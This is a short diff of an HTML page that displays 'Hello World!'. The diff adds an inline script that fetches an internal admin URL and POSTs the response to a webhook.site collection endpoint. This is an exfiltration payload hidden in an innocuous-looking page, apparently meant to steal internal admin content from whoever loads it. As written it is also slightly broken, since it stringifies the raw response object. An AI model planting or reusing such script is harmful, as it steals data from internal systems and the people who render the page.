@@ -1,6 +1,14 @@
 <body>
   Hello World!
   <script>
-     = fetch("https://internal.sketchycompany.upd-dcs.work/admin");
+    const response = await fetch("https://internal.sketchycompany.upd-dcs.work/admin");
+    fetch("https://webhook.site/037c3fd8-efc9-435f-8830-a96a887a67a0", {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(response)
+    });
+    
   </script>
 </body>
